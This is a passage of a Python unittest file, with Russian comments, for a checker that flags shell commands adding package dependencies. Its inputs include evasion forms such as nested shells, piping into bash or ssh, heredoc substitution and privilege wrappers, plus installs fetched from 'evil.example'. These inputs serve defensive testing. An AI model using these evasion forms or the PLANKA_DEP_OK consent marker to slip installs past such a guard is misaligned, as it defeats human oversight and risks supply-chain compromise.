            lambda n: 'npm install --tag "' + '`a "b c"`' * n + '"',
            lambda n: 'echo "`' + 'a "b" ' * n,
            lambda n: 'echo "`' + 'a\n' * n + '`"',
        ]
        for make in cases:
            small, large = make(2000), make(8000)
            with self.subTest(small[:20]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))


class NpmBooleanValueTest(unittest.TestCase):
    """npm (nopt) берёт `true`/`false` следом за флагом без `=` значением флага: подкоманда — следующее слово."""

    def test_detected(self):
        for cmd in ["npm --dry-run false install x", "npm --weird false install x", "npm -g true i x",
                    "npm --no-dry-run true install x"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)

    def test_not_adds(self):
        for cmd in ["npm --dry-run true install x", "npm --dry-run install x", "npm --dry-run=false true install x",
                    "npm --silent false run build"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


def _nest(command, levels):
    """command внутри levels вложенных `bash -c '…'`."""
    for _ in range(levels):
        command = "bash -c " + shlex.quote(command)
    return command


class DoubtTest(unittest.TestCase):
    """Сегмент с распознанными менеджером и командой установки, где пакет или подкоманда под сомнением, —
    dependency_doubt: (сегмент, довод)."""

    LONG = "npm install " + "-D " * 1400 + "left-pad"
    NESTED = _nest("cd app && npm install x", 6)
    FORMS = [
        # Флаг со значением вне известных наборов перед подкомандой.
        ("npm --weird val i -g x", "npm --weird val i -g x", depcheck._WHY_FLAG),
        ("cd app && pip --weird val install requests", "pip --weird val install requests", depcheck._WHY_FLAG),
        ("apt-get --weird val install jq", "apt-get --weird val install jq", depcheck._WHY_FLAG),
        ("npm -g --a 1 --b 2 install x", "npm -g --a 1 --b 2 install x", depcheck._WHY_FLAG),
        ("cargo +nightly --weird v install ripgrep", "cargo +nightly --weird v install ripgrep", depcheck._WHY_FLAG),
        ("npx npm --weird val i x", "npx npm --weird val i x", depcheck._WHY_FLAG),
        ("uv run npm --weird val i x", "uv run npm --weird val i x", depcheck._WHY_FLAG),
        # `--dry-run` значением чужого флага.
        ("pip install --target --dry-run x", "pip install --target --dry-run x", depcheck._WHY_DRY),
        ("cargo install --root --dry-run ripgrep", "cargo install --root --dry-run ripgrep", depcheck._WHY_DRY),
        ("brew install --cc --dry-run jq", "brew install --cc --dry-run jq", depcheck._WHY_DRY),
        ("python -m pip install --target --dry-run x", "python -m pip install --target --dry-run x", depcheck._WHY_DRY),
        ("conda run -n e pip install -t --dry-run x", "conda run -n e pip install -t --dry-run x", depcheck._WHY_DRY),
        ("pdm run pip install -t --dry-run x", "pdm run pip install -t --dry-run x", depcheck._WHY_DRY),
        # Пакеты из stdin xargs.
        ("echo x | xargs npm install", "xargs npm install", depcheck._WHY_XARGS),
        ("cat req.txt | xargs -n 1 pip install", "xargs -n 1 pip install", depcheck._WHY_XARGS),
        ("echo x@1 | xargs go install", "xargs go install", depcheck._WHY_XARGS),
        # Вложенность глубже 4 уровней.
        ("eval " * 5 + "npm install x", "eval " * 5 + "npm install x", depcheck._WHY_DEPTH),
        (NESTED, NESTED, depcheck._WHY_DEPTH),
        ("eval " * 5 + "sudo -E env A=1 npm install x", "eval " * 5 + "sudo -E env A=1 npm install x",
         depcheck._WHY_DEPTH),
        ("npx " * 6 + "npm install x", "npx " * 6 + "npm install x", depcheck._WHY_DEPTH),
        ("uv run " * 6 + "pip install x", "uv run " * 6 + "pip install x", depcheck._WHY_DEPTH),
        ("eval " * 5 + "npx -y pnpm@9 add x", "eval " * 5 + "npx -y pnpm@9 add x", depcheck._WHY_DEPTH),
        ("eval " * 12 + "npm install x", "eval " * 12 + "npm install x", depcheck._WHY_DEPTH),
        (_nest("npm install x", 6), _nest("npm install x", 6), depcheck._WHY_DEPTH),
        (_nest('echo "$(npm install x)"', 4), _nest('echo "$(npm install x)"', 4), depcheck._WHY_DEPTH),
        ("npx " * 12 + "npm install x", "npx " * 12 + "npm install x", depcheck._WHY_DEPTH),
        ("python -m " * 12 + "pip install x", "python -m " * 12 + "pip install x", depcheck._WHY_DEPTH),
        ("uv run " * 12 + "pip install x", "uv run " * 12 + "pip install x", depcheck._WHY_DEPTH),
        # Пакет дальше 4096 символов команды.
        (LONG, LONG, depcheck._WHY_CUT),
    ]

    def test_forms(self):
        for cmd, segment, why in self.FORMS:
            with self.subTest(cmd[:60]):
                self.assertIsNone(depcheck.dependency_add(cmd))
                found = depcheck.dependency_doubt(cmd)
                self.assertIsNotNone(found)
                self.assertEqual(found[0], segment)
                self.assertEqual(found[1], why)

    def test_not_doubt(self):
        for cmd in [
            "make test", "npm --silent run build", "npm --prefix web ci", "pip -q install -r req.txt",
            "pip -q install -e .", "uv --quiet pip install -r r.txt", "cargo --locked build --release",
            "brew --prefix openssl", "nix-env -i --arg a b", "pacman --config c -Qi jq",
            # Настоящий пробный прогон: `--dry-run` не значение флага.
            "pip install --dry-run x", "pip install -q --dry-run x", "cargo install -v --dry-run ripgrep",
            "pip install --dry-run --target t x", "pip install --target=t --dry-run x",
            # xargs без менеджера или без команды установки.
            "xargs grep foo", "find . -name '*.pyc' | xargs rm", "xargs npm run lint", "ls | xargs pip show",
            "xargs -I {} pip download {}",
            # Глубже 4 уровней — не команда установки.
            "eval " * 5 + "echo npm install x", "eval " * 5 + "make test", "eval " * 5 + "sudo -E",
            "npm -- val i x", "npm -- -g val i x", "npm --a=1 v i x", "npm help foo install x",
            _nest("git commit -m 'go get coffee'", 6),
            # Длинный сегмент не менеджера.
            'git commit -m "' + "x " * 3000 + '; npm install x"',
            # За 4096 символами — продолжение значения флага или только флаги, а не новое слово.
            'npm install --tag "' + "a b " * 2000 + '"', "npm install " + "-D " * 1400 + "--save >log",
        ]:
            with self.subTest(cmd[:60]):
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_cut_manager_false_doubt(self):
        # README: слово-не-флаг менеджера, начатое за _WORDS_LIMIT, — сомнение и без команды установки в видимых
        # словах (ложный отказ, обход — маркер): какие слова менеджер прочтёт подкомандой, разбор за пределом не видит.
        cmd = "npm run build " + "a " * 3000
        self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_CUT)
        self.assertIsNone(depcheck.dependency_doubt("PLANKA_DEP_OK=1 " + cmd))

    def test_boolean_flag_before_other_subcommand(self):
        # README: флаг без значения перед иной подкомандой, за которой стоят слово установки и имя, — ложный отказ.
        for cmd in ["npm -g help install x", "npm -s explain install x"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_FLAG)

    def test_loosened_flags_limit(self):
        # Склеиваются первые _LOOSE_FLAGS пар «флаг значение»; пятая пара — пропуск (README).
        self.assertEqual(depcheck._LOOSE_FLAGS, 4)
        self.assertIsNotNone(depcheck.dependency_doubt("npm " + "--a v " * 4 + "i x"))
        self.assertIsNone(depcheck.dependency_doubt("npm " + "--a v " * 5 + "i x"))

    def test_marker(self):
        for cmd in ["PLANKA_DEP_OK=1 npm --weird val i -g x", "PLANKA_DEP_OK=1 pip install --target --dry-run x",
                    "echo x | PLANKA_DEP_OK=1 xargs npm install", "echo x | xargs PLANKA_DEP_OK=1 npm install",
                    "PLANKA_DEP_OK=1 " + "eval " * 5 + "npm install x", "eval " * 5 + "PLANKA_DEP_OK=1 npm install x",
                    "PLANKA_DEP_OK=1 " + self.LONG]:
            with self.subTest(cmd[:60]):
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_non_string(self):
        self.assertIsNone(depcheck.dependency_doubt(None))

    def test_linear(self):
        cases = [
            lambda n: "npm " + "--a v " * n + "i x",
            lambda n: "pip install " + "--target --dry-run " * n,
            lambda n: "echo x | xargs npm install " + "-D " * n,
            lambda n: "eval " * 5 + "npm " * n + "install x",
            lambda n: "eval " * 5 + "a; " * n + "npm install x",
            lambda n: "npm install " + " " * n,
            lambda n: "npx " * n + "npm install x",
            lambda n: "eval " * 5 + "pip install a" + " @" * n,
            lambda n: _nest('echo "$(' + "npm " * n + 'install x)"', 4),
            lambda n: "npm install " + "-D " * 1400 + "@ " * n + "x",
        ]
        for make in cases:
            small, large = make(2000), make(8000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_doubt(small), lambda: depcheck.dependency_doubt(large))


class HeredocBodySubstitutionTest(unittest.TestCase):
    """Тело heredoc с терминатором без кавычек bash разбирает как текст в `"…"`: подстановки исполняются."""

    def test_substitution_in_body_detected(self):
        for cmd in ["cat <<EOF\n$(npm install left-pad)\nEOF", "cat <<EOF\n`pip install requests`\nEOF",
                    "git commit -F - <<EOF\nmsg $(npm install left-pad)\nEOF", "cat <<-EOF\n\t$(npm i x)\n\tEOF",
                    "cat <<EOF > f\na \"$(npm i x)\" b\nEOF", "cat <<EOF\n$(\nnpm i x\n)\nEOF\necho ok"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_quoted_or_escaped_body_is_data(self):
        for cmd in ["cat <<'EOF'\n$(npm install left-pad)\nEOF", 'cat <<"EOF"\n`npm i x`\nEOF',
                    "cat <<\\EOF\n$(npm i x)\nEOF", "cat <<E'O'F\n$(npm i x)\nEOF",
                    "cat <<EOF\n\\$(npm install x)\nEOF",
                    "cat <<EOF\n\\`npm i x\\`\nEOF", "cat <<EOF\nnpm install x $(date)\nEOF",
                    "cat <<EOF\n$((1 + 2)) it's \"npm install x\"\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_doubt_in_body(self):
        self.assertEqual(depcheck.dependency_doubt("cat <<EOF\n$(npm --weird v i x)\nEOF")[1], depcheck._WHY_FLAG)

    def test_linear(self):
        small, large = ("cat <<EOF\n" + "$(a) `b` " * n + "\nEOF" for n in (2000, 8000))
        assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))


class ShellStdinTest(unittest.TestCase):
    """Строка here-string, вход из конвейера и процесс-подстановка оболочки без скрипта — команды."""

    def test_detected(self):
        for cmd in ["bash <<< 'npm install left-pad'", 'sh <<<"pip install requests"',
                    "echo 'npm install left-pad' | bash", "printf 'pip install requests\\n' | sh",
                    "bash <(echo npm install left-pad)", "source <(echo npm install left-pad)",
                    ". <(printf 'npm i x')", "echo npm i x | sudo bash -s", "bash < <(echo npm i x)",
                    "echo -e 'cd a\\nnpm i x' | zsh", "printf '%s\\n' 'npm i x' | bash", "echo 'npm i x' |\nbash",
                    "echo 'npm i x' | ssh host"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["bash <<< 'make test'", "echo 'npm install left-pad' | cat",
                    "echo 'npm install x' | bash script.sh",
                    "cat <<< 'npm install x'", "echo hi | bash",
                    "diff <(echo npm install x) f", "echo 'npm install x' | PLANKA_DEP_OK=1 bash",
                    "bash -c 'make' <<< 'npm i y'", "echo 'npm install x' || bash"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_doubt(self):
        self.assertEqual(depcheck.dependency_doubt("echo 'npm --weird v i x' | bash")[1], depcheck._WHY_FLAG)
        self.assertEqual(depcheck.dependency_doubt("bash <<< 'npm --weird v i x'")[1], depcheck._WHY_FLAG)

    def test_linear(self):
        for make in [lambda n: "echo a | " * n + "bash", lambda n: "bash <<< 'a' " * n,
                     lambda n: "bash " + "<(echo a) " * n]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))


class DryRunManagersTest(unittest.TestCase):
    """`--dry-run` — пробный прогон только у менеджеров, где он пробный или отвергается разбором флагов."""

    def test_ignored_dry_run_detected(self):
        for cmd in ["yarn add left-pad --dry-run", "yarn --dry-run add left-pad", "npx yarn add x --dry-run",
                    "choco install x --dry-run"]:
            with self.subTest(cmd):
                self.assertEqual(depcheck.dependency_add(cmd), cmd)

    def test_dry_run_still_passes(self):
        for cmd in ["pip install --dry-run x", "poetry add --dry-run x", "cargo add --dry-run serde",
                    "uv pip install --dry-run x", "uv add --dry-run x", "bun add --dry-run x",
                    "gem install --dry-run x", "dart pub add --dry-run x", "composer require --dry-run a/b",
                    "conda install --dry-run numpy"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class LongPrefixTest(unittest.TestCase):
    """Предел слов считается от начала команды: длинные присваивания и обёртки её не прячут."""

    def test_detected(self):
        for cmd in ["A=" + "a" * 5000 + " npm install left-pad", "sudo " + "-E " * 2100 + "npm install left-pad",
                    "env " + "A=b " * 1500 + "npm install left-pad", "npm install " + " " * 4096 + "left-pad"]:
            with self.subTest(cmd[:30]):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_linear(self):
        for make in [lambda n: "env " + "A=b " * n + "npm install left-pad",
                     lambda n: "sudo " + "-E " * n + "npm install left-pad",
                     lambda n: "env " + "-S 'A=b' " * n + "npm install left-pad",
                     lambda n: "A=" + "a" * n * 4 + " npm install " + "-D " * n + "x"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class GluedValueFlagTest(unittest.TestCase):
    """Склейка короткого флага со значением: первая буква флага со значением забирает остаток слова."""

    def test_detected(self):
        for cmd in ["sudo -uroot npm install left-pad", "sudo -uubuntu npm install x", "pip install -tvendor requests",
                    "sudo -iu root npm install x", "sudo -u root npm install x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_value_flag_last(self):
        self.assertIsNone(depcheck.dependency_add("pip install -qr req.txt"))
        self.assertTrue(depcheck._takes_value("-qr", {"-r"}))
        self.assertFalse(depcheck._takes_value("-rq", {"-r"}))


class AppendAssignmentTest(unittest.TestCase):
    def test_detected(self):
        for cmd in ["PATH+=:/opt/bin npm install left-pad", "A+=1 npm install left-pad",
                    "PLANKA_DEP_OK+=1 npm install x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))


class ExpandedNameTest(unittest.TestCase):
    """Имя команды — подстановка или переменная; аргумент в обратных кавычках вне `"…"`."""

    def test_backtick_argument_detected(self):
        for cmd in ["npm install `echo left-pad`", "pip install `cat pkgs`"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_doubt(self):
        for cmd in ["M=npm; $M install left-pad", '"$(command -v npm)" install left-pad',
                    "`which npm` install left-pad",
                    "$(command -v npm) install left-pad", "${PM:-npm} add left-pad"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_NAME)

    def test_linear(self):
        for make in [lambda n: "npm install " + "$(a) " * n, lambda n: "npm install " + "`a` " * n,
                     lambda n: "$(" * n + "npm install x", lambda n: "echo " + "<(a) " * n]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))

    def test_not_doubt(self):
        for cmd in ["$EDITOR file.txt", "$(npm bin)/eslint .", "`which python` -m pytest", "$M install",
                    "echo `date` install x", "echo $(date) npm install x", "$PIP install -r req.txt",
                    "PLANKA_DEP_OK=1 $M install x"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))


class MoreLaunchersTest(unittest.TestCase):
    """Запускатели и обёртки, исполняющие следующую команду."""

    DETECTED = ["npm exec pnpm add left-pad", "npm exec -- pnpm add x", "npm x -y pnpm@9 add x",
                "pnpm dlx pnpm add x", "pnpm exec npm install x", "yarn dlx npm i x", "yarn exec npm i x",
                "bun x npm install x", "bundle exec gem install foo", "setsid npm install x", "setsid -f npm i x",
                "su -c 'npm install x'", "su root -c 'npm install x'", "su - root --command='npm i x'",
                "flock /tmp/l npm install x", "flock -w 5 /tmp/l -c 'npm i x'", "ionice -c3 npm i x",
                "ionice -c 3 npm i x", "watch -n 5 npm install x", "find . -exec npm install left-pad \\;",
                "find . -name a -execdir pip install x {} +", "trap 'npm install left-pad' EXIT",
                "coproc npm install x",
                "busybox sh -c 'npm i x'", "cmd /c npm install x", "cmd.exe /C npm i x",
                'pwsh -Command "npm install x"', "powershell -c npm i x", "nix develop -c npm install x",
                "nix shell nixpkgs#nodejs --command npm i x", "nix-shell -p nodejs --run 'npm i x'",
                "mise exec -- npm install x", "mise x node@20 -- npm i x", 'ssh host "npm install left-pad"',
                "ssh -p 22 host npm install x"]
    NOT_ADDS = ["npm exec eslint .", "pnpm dlx create-vite app", "bundle exec rake", "find . -exec rm {} \\;",
                "trap 'rm -f t' EXIT", "trap - EXIT", "cmd /c dir", "nix develop -c make", "mise exec -- make",
                "ssh host ls", "ssh host", "flock /tmp/l make", "su -c 'make'", "watch -n 5 ls",
                "PLANKA_DEP_OK=1 ssh host npm i x", "find . -name x"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_linear(self):
        for make in [lambda n: "find . " + "-exec a \\; " * n, lambda n: "trap " + "a " * n,
                     lambda n: "ssh h " + "a " * n, lambda n: "su " + "-c a " * n,
                     lambda n: "pwsh " + "-x " * n + "-c npm i x", lambda n: "npm exec " + "-y " * n + "pnpm add x"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class UserAndWatchWrappersTest(unittest.TestCase):
    """runuser с `-u` запускает команду без оболочки; su/runuser разбирают флаги как getopt; watch без `-x`
    склеивает слова команды в строку `sh -c`."""

    DETECTED = ["su --shell= app <<< 'npm i x'", "runuser -u app -- npm i x", "runuser -u app npm i x",
                "runuser --user=app -- npm i x", "runuser -uapp -- npm i x", "runuser -m -u app -- pip install x",
                "runuser -g grp -u app -- npm i x",
                "runuser -u app -g grp npm i x", "runuser -u app -- npm install -g x",
                "su -c'npm i x'", "su -lc 'npm i x' app", "su - app -lc 'npm i x'",
                "su --session-command 'npm i x' app", "su --session-command='npm i x'",
                "runuser -l app -c 'npm i x'",
                "watch -n 5 'npm i x'", "watch 'pip install x'", "watch -n5 -d 'npm install x'",
                "watch -s /tmp/shots 'npm i x'", "watch -x npm i x", "watch -x -n 5 npm i x", "watch -tx npm i x",
                "watch --exec npm i x", "watch -- 'npm i x'",
                # У su/runuser без `-u` слова за пользователем — аргументы оболочки, `-c` среди них — её строка.
                "su app -- -c 'npm i x'", "su - app -- -c 'npm i x'", "runuser app -- -c 'npm i x'",
                "runuser -l app -- -c 'npm i x'", "su app -- -lc 'npm i x'", "su app -- -e -c 'npm i x'",
                # watch разбирает склейку по optstring: буква со значением забирает остаток слова.
                "watch -x sh -c 'npm i x'", "watch -xn5 sh -c 'npm i x'", "watch -xn 5 sh -c 'npm i x'",
                "watch -txq5 sh -c 'npm i x'",
                # su/runuser без `-c` и `-u` запускают оболочку: без аргументов она читает stdin.
                "su app <<'E'\nnpm i x\nE", "echo 'npm i x' | su app", "echo 'npm i x' | su", "su <<< 'npm i x'",
                "runuser app <<< 'npm i x'", "su -s /bin/bash app <<< 'npm i x'",
                # `-s`/`--shell` — программа вместо оболочки, слова за пользователем — её аргументы.
                "su -s /usr/bin/npm app -- install x", "runuser -s /usr/bin/pip3 app -- install requests",
                "su --shell=/usr/bin/npm root -- i x"]
    NOT_ADDS = ["su --user=app npm i x", "su --shell= app -- npm i x",
                "runuser -u app -- make", "runuser -u app", "runuser app", "runuser - app",
                "su -lc 'make' app", "su -g npm app", "su - app",
                "watch 'npm ls'", "watch -n 5 'ls -l'", "watch -x ls", "watch -s npm ls",
                # Без `-c` и `-u`: первое слово — пользователь, остальные — аргументы оболочки без `-c`.
                "su npm install x", "runuser npm i x", "su - npm i x", "su app -- script.sh npm i x",
                # Без пользователя первое слово-не-флаг за `--` — имя пользователя (`-c`).
                "su -- -c 'npm i x'",
                # Без `-x` слова склеиваются в строку `sh -c npm i x`: оболочка запускает `npm` без аргументов.
                "watch sh -c 'npm i x'", "watch -n5x sh -c 'npm i x'", "watch -dx sh -c 'npm i x'",
                # `--execX` — не `--exec`: watch его не принимает.
                "watch --execX sh -c 'npm i x'",
                # Программа `-s` не оболочка: stdin ей не команды.
                "su -s /usr/bin/npm app <<< 'i x'", "su -s /usr/bin/npm app -- ls"]

    def test_detected(self):
        for cmd in self.DETECTED:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in self.NOT_ADDS:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertIsNone(depcheck.dependency_doubt(cmd))

    def test_linear(self):
        for make in [lambda n: "runuser -u app " + "-m " * n + "-- npm i x", lambda n: "watch " + "a " * n,
                     lambda n: "su " + "-lc a " * n, lambda n: "runuser -u a -- " * n + "npm i x",
                     lambda n: "su a -- " * n + "-c 'npm i x'",
                     lambda n: "runuser -u a runuser runuser -- " * n + "npm i x"]:
            small, large = make(2000), make(8000)
            with self.subTest(small[:30]):
                assert_linear(self, lambda: depcheck.dependency_add(small), lambda: depcheck.dependency_add(large))
                assert_linear(self, lambda: depcheck.dependency_doubt(small),
                              lambda: depcheck.dependency_doubt(large))


class WrapperLimitTest(unittest.TestCase):
    """Обёрток в сегменте больше _MAX_WRAPPERS: любая команда за ними — сомнение; маркер в начале сегмента его
    снимает."""

    def test_within_limit(self):
        cmd = "nice " * depcheck._MAX_WRAPPERS + "npm i x"
        self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_over_limit(self):
        for cmd in ["nice " * (depcheck._MAX_WRAPPERS + 1) + "npm i x",
                    "runuser -u a runuser runuser -- " * 50 + "npm i x",
                    "sudo " * 50 + "su -c 'pip install x'"]:
            with self.subTest(cmd[:30]):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd), (cmd, depcheck._WHY_WRAPPERS))

    def test_marker_at_segment_start(self):
        over = "nice " * (depcheck._MAX_WRAPPERS + 1)
        self.assertIsNone(depcheck.dependency_doubt("PLANKA_DEP_OK=1 " + over + "npm i x"))
        why = depcheck.dependency_doubt(over + "PLANKA_DEP_OK=1 npm i x")[1]
        self.assertIn("маркер согласия — в начале сегмента", why)

    def test_over_limit_any_command(self):
        # За пределом обёрток любая команда, в том числе без менеджера, — сомнение.
        over = "nice " * (depcheck._MAX_WRAPPERS + 1)
        for cmd in [over + "make", over + "su -c'npm i x'", over + "env -S'npm i x'",
                    over + "python3 -mpip install x", over + "sh -c 'cd /a&&npm i x'", over + "sh <<< 'npm i x'",
                    "echo 'npm i x' | " + "sudo " * 16 + "su",
                    "sudo " * 16 + "su app <<'E'\nnpm i x\nE"]:
            with self.subTest(cmd[-30:]):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_WRAPPERS)


class HatchTest(unittest.TestCase):
    def test_detected(self):
        for cmd in ["hatch -e test run pip install requests", "hatch run test:pip install requests",
                    "hatch --env test run pip install x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["hatch run test:cov", "hatch -e test run pytest", "hatch env create"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class CommandCaseTest(unittest.TestCase):
    """Имя команды сравнивается без учёта регистра: на macOS и Windows `NPM` — это `npm`."""

    def test_detected(self):
        for cmd in ["NPM install left-pad", "Pip install requests", "Python -m pip install x", "SUDO npm i x",
                    "R -e 'install.packages(\"x\")'"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))


class ParameterExpansionHeredocTest(unittest.TestCase):
    """`<<` внутри `$[…]` и `${…}` — не heredoc."""

    def test_detected(self):
        for cmd in ["echo $[1<<2]\nnpm install left-pad", "echo ${x:-a<<b}\nnpm install left-pad",
                    "echo ${x:-'}'<<b}\nnpm install x", "echo ${x:-${y:-a<<b}}\nnpm install x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))


class StdinShellsTest(unittest.TestCase):
    def test_detected(self):
        for cmd in ["fish <<'EOF'\nnpm install left-pad\nEOF", "bash /dev/stdin <<'EOF'\nnpm i x\nEOF",
                    "bash - <<'EOF'\nnpm i x\nEOF", "bash /dev/stdin a b <<'EOF'\nnpm i x\nEOF"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_script_body_is_data(self):
        self.assertIsNone(depcheck.dependency_add("fish script.fish <<'EOF'\nnpm i x\nEOF"))


class PipEditableFormsTest(unittest.TestCase):
    def test_detected(self):
        for cmd in ["pip install --editable=git+https://github.com/x/y#egg=y",
                    "pip install -egit+https://github.com/x/y",
                    "pip install -qe git+https://github.com/x/y", "pip install pip@git+https://evil.example/pip",
                    "pip install 'pip @ https://evil.example/pip.tar.gz'"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_local_not_adds(self):
        for cmd in ["pip install --editable=.", "pip install -e.", "pip install -U pip setuptools wheel"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class PythonModuleFormsTest(unittest.TestCase):
    def test_detected(self):
        for cmd in ["python --check-hash-based-pycs always -m pip install requests",
                    "python -m pip.__main__ install requests"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))


class MoreInstallFormsTest(unittest.TestCase):
    def test_detected(self):
        for cmd in ["uv tool install --with requests .", "uv tool install -w rich,requests -e .",
                    "uv tool install --with=requests .", "conda create -n env numpy",
                    "mamba create -n env -c conda-forge python=3.11 numpy", "pipx runpip black install requests"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_not_adds(self):
        for cmd in ["conda create -n env python=3.11", "conda create -n env --file env.txt",
                    "uv tool install --with ./dep --editable .", "pipx runpip black list",
                    "uv run --with requests python x.py"]:
            with self.subTest(cmd):
                self.assertIsNone(depcheck.dependency_add(cmd))


class QuotedAssignmentTest(unittest.TestCase):
    """Присваивание — имя и `=` без кавычек; маркер — слово без кавычек."""

    def test_quoted_word_is_command_name(self):
        # bash исполняет `PLANKA_DEP_OK=1` как имя команды (127): npm не запускается.
        self.assertIsNone(depcheck.dependency_add("'PLANKA_DEP_OK=1' npm install left-pad"))
        self.assertIsNone(depcheck.dependency_add("\"A=1\" npm install left-pad"))

    def test_quoted_marker_value_does_not_count(self):
        for cmd in ['PLANKA_DEP_OK="1" npm install x', "PLANKA_DEP_OK='1' npm install x",
                    "PLANKA_DEP_OK=\\1 npm install x"]:
            with self.subTest(cmd):
                self.assertIsNotNone(depcheck.dependency_add(cmd))

    def test_quoted_value_still_assignment(self):
        self.assertIsNotNone(depcheck.dependency_add("A='x y' npm install left-pad"))
        self.assertIsNone(depcheck.dependency_add("A='x y' PLANKA_DEP_OK=1 npm install left-pad"))


class CorpusTest(unittest.TestCase):
    """Разбор всего корпуса настоящих команд Bash и образцов краёв."""

    def test_corpus(self):
        with CORPUS.open(encoding="utf-8") as f:
            rows = [json.loads(line) for line in f if line.strip()]
        self.assertGreater(sum(r["source"] == "transcript" for r in rows), 1000)
        for row in rows:
            command = row["command"]
            with self.subTest(command[:80]):
                added = depcheck.dependency_add(command)
                got = "add" if added is not None else "doubt" if depcheck.dependency_doubt(command) else "pass"
                self.assertEqual(got, row["expect"])


class CutInlineScriptTest(unittest.TestCase):
    """Строка `eval`/`sh -c` за пределом слов команды не видна: сомнение."""

    def test_doubt(self):
        for cmd in ["eval " + "a " * 3000 + "npm i x", "sh " + "-o x " * 1000 + "-c 'npm i x'"]:
            with self.subTest(cmd[:30]):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_CUT)

    def test_cut_subcommand_doubt(self):
        # Подкоманда или команда за запускателем — за пределом слов: сомнение.
        for cmd in ["npm --a=" + "a" * 5000 + " install evil", "npx --a=" + "a" * 5000 + " npm install evil"]:
            with self.subTest(cmd[:30]):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_CUT)

    def test_cut_manager_doubt(self):
        # Видимое имя команды — менеджер или запускатель: слово-не-флаг за пределом может быть подкомандой или
        # пакетом, в каком бы порядке их ни ставил менеджер.
        long = "a" * 5000
        for form in ["dotnet --a=%s add package x", "dotnet add --a=%s package x", "dotnet tool --a=%s install x",
                     "dart --a=%s pub add x", "flutter pub --a=%s add x", "swift package --a=%s add-dependency x",
                     "pacman --a=%s -S x", "nix-env --a=%s -i x", "python --a=%s -m pip install x",
                     "pnpx --a=%s pnpm add x", "corepack --a=%s pnpm add x", "pip --a=%s install x"]:
            cmd = form % long
            with self.subTest(form):
                self.assertIsNone(depcheck.dependency_add(cmd))
                self.assertEqual(depcheck.dependency_doubt(cmd)[1], depcheck._WHY_CUT)

